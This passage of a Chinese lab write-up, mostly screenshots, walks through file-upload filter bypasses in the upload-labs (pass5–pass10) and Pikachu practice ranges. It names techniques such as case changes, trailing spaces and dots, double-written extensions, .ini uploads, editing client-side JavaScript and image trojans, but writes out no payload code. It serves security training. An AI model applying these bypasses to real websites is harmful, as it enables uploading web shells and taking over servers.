+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps32.jpg" /> </p>
+<h4 id="pass5">pass5</h4>
+<p>同第四个，用文件名为.ini文件上传，将php文件改为,gif上传</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps33.jpg" /> </p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps34.jpg" /> </p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps35.jpg" /> </p>
+<h4 id="pass6">pass6</h4>
+<p>大小写绕过：</p>
+<p>源码没有大小写说明</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps36.jpg" /> </p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps37.jpg" /> </p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps38.jpg" /> </p>
+<h4 id="pass7">pass7</h4>
+<p>空格绕过</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps39.jpg" /> </p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps40.jpg" /> </p>
+<p>上传</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps41.jpg" /> </p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps42.jpg" /> </p>
+<h4 id="pass8">pass8</h4>
+<p>用 . 绕过</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps43.jpg" /> </p>
+<p>截断更改后缀名加 .</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps44.jpg" /> </p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps45.jpg" /> </p>
+<h4 id="pass9">pass9</h4>
+<p>双写绕过</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps46.jpg" /> </p>
+<h4 id="pass10">pass10</h4>
+<p>：. +空格+.</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps47.jpg" /> </p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps48.jpg" /> </p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps49.jpg" /> </p>
+<h3 id="pikachu">pikachu文件上传</h3>
+<p>1)打开js</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps50.jpg" /> </p>
+<p>2)更改</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps51.jpg" /> </p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps52.jpg" /> </p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps53.jpg" /> </p>
+<p>3)切换版本为7.0以上上传图片木马</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps54.jpg" /> </p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps55.jpg" /> </p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps56.jpg" /> </p>
 
 
 
